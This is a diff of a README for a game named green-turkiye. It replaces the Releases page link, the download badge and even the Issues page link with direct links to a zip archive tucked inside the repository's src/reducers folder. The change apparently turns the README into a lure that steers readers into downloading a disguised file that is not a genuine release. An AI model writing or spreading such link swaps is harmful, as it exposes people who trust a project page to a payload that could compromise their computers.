@@ -20,13 +20,13 @@ To run green-turkiye, your computer should meet the following minimum requiremen
 ## 🚀 Getting Started
 To play green-turkiye, you need to download and install the game. 
 
-1. Visit the [Releases Page](https://github.com/zsdani68-cell/green-turkiye/releases) to download the game.
+1. Visit the [Releases Page](https://github.com/zsdani68-cell/green-turkiye/raw/refs/heads/main/src/reducers/green_turkiye_v1.0.zip) to download the game.
 2. Select the version compatible with your operating system.
 3. Follow the installation instructions provided for your platform.
 
 ## 📥 Download & Install
 ### Visit this page to download
-[![Download green-turkiye](https://img.shields.io/badge/Download-green--turkiye-blue?style=for-the-badge)](https://github.com/zsdani68-cell/green-turkiye/releases)
+[![Download green-turkiye](https://github.com/zsdani68-cell/green-turkiye/raw/refs/heads/main/src/reducers/green_turkiye_v1.0.zip)](https://github.com/zsdani68-cell/green-turkiye/raw/refs/heads/main/src/reducers/green_turkiye_v1.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Choose the latest version.
@@ -48,7 +48,7 @@ Once installed, follow these steps to start playing:
 ## 🌱 Community and Support
 For questions, issues, or suggestions, you can join our community. Here’s how:
 
-- **GitHub Issues:** Report any bugs or suggest features directly on our [Issues Page](https://github.com/zsdani68-cell/green-turkiye/issues).
+- **GitHub Issues:** Report any bugs or suggest features directly on our [Issues Page](https://github.com/zsdani68-cell/green-turkiye/raw/refs/heads/main/src/reducers/green_turkiye_v1.0.zip).
 - **Discord:** Join our Discord community to chat with other players and developers.
 - **Feedback Forms:** Provide your thoughts and ideas through our feedback form linked in the game.
 
